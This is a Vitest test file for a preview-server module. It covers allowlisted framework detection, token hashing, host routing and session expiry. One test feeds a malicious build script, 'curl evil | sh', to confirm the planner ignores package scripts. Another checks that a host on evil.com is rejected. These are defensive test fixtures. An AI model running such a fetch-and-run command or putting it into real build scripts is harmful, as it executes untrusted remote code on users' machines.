import { describe, it, expect } from "vitest";
import {
  planPreview,
  parsePreviewHost,
  previewHost,
  hashToken,
  tokenMatches,
  previewDomainIsSafe,
  isExpired,
  newSessionId,
  newAccessToken,
} from "../../server/src/preview/core";

describe("preview framework detection (allowlist)", () => {
  it("serves a plain index.html statically with no install step", () => {
    const p = planPreview(["index.html", "app.js"], null);
    expect(p.supported && p.framework).toBe("static");
    expect(p.supported && p.setup).toBeNull();
  });
  it("detects Vite + React and builds with the vite binary, not package scripts", () => {
    const p = planPreview(["package.json", "package-lock.json", "index.html"], {
      dependencies: { react: "18" },
      devDependencies: { vite: "5" },
    });
    expect(p.supported && p.framework).toBe("react");
    expect(p.supported && p.setup).toBe(
      "npm ci --no-audit --no-fund && npx --no-install vite build",
    );
  });
  it("detects Next.js", () => {
    const p = planPreview(["package.json"], { dependencies: { next: "14", react: "18" } });
    expect(p.supported && p.framework).toBe("nextjs");
    expect(p.supported && p.start).toContain("next start -H 0.0.0.0 -p 3000");
  });
  it("never uses package.json scripts", () => {
    const p = planPreview(["package.json"], {
      dependencies: { vite: "5" },
      scripts: { build: "curl evil | sh" },
    } as never);
    expect(JSON.stringify(p)).not.toContain("evil");
  });
  it("rejects unknown bundlers and monorepos with an explanation", () => {
    const a = planPreview(["package.json"], { dependencies: { react: "18", webpack: "5" } });
    expect(a.supported).toBe(false);
    const b = planPreview(["package.json"], { workspaces: ["apps/*"] });
    expect(b.supported).toBe(false);
    const c = planPreview(["main.py"], null);
    expect(c.supported).toBe(false);
  });
});

describe("preview access tokens and host routing", () => {
  const id = newSessionId(),
    token = newAccessToken();
  it("generates 80-bit ids and 128-bit tokens", () => {
    expect(id).toMatch(/^[a-f0-9]{20}$/);
    expect(token).toMatch(/^[a-f0-9]{32}$/);
  });
  it("round-trips the capability host", () => {
    expect(parsePreviewHost(previewHost(id, token, "1.2.3.4.nip.io"), "1.2.3.4.nip.io")).toEqual({
      id,
      token,
    });
    expect(
      parsePreviewHost(`${previewHost(id, token, "p.example.net")}:443`, "p.example.net"),
    ).toEqual({ id, token });
  });
  it("rejects malformed hosts and other domains", () => {
    expect(parsePreviewHost(`${id}-${token}.evil.com`, "p.example.net")).toBeNull();
    expect(parsePreviewHost(`${id}.p.example.net`, "p.example.net")).toBeNull();
    expect(parsePreviewHost(`a.${id}-${token}.p.example.net`, "p.example.net")).toBeNull();
    expect(parsePreviewHost("p.example.net", "p.example.net")).toBeNull();
  });
  it("only stores a hash and compares in constant time", () => {
    const h = hashToken(token);
    expect(h).not.toContain(token);
    expect(tokenMatches(token, h)).toBe(true);
    expect(tokenMatches(newAccessToken(), h)).toBe(false);
  });
  it("requires the preview site to differ from the app site", () => {
    expect(previewDomainIsSafe("139.84.166.173.nip.io", "http://139.84.166.173")).toBe(true);
    expect(previewDomainIsSafe("preview.rewind.dev", "https://rewind.dev")).toBe(false);
    expect(previewDomainIsSafe("rewind.dev", "https://rewind.dev")).toBe(false);
    expect(previewDomainIsSafe(undefined, "https://rewind.dev")).toBe(false);
  });
  it("expires sessions at their expiry time", () => {
    const now = new Date("2026-01-01T00:20:00Z");
    expect(isExpired(new Date("2026-01-01T00:20:00Z"), now)).toBe(true);
    expect(isExpired(new Date("2026-01-01T00:20:01Z"), now)).toBe(false);
  });
});
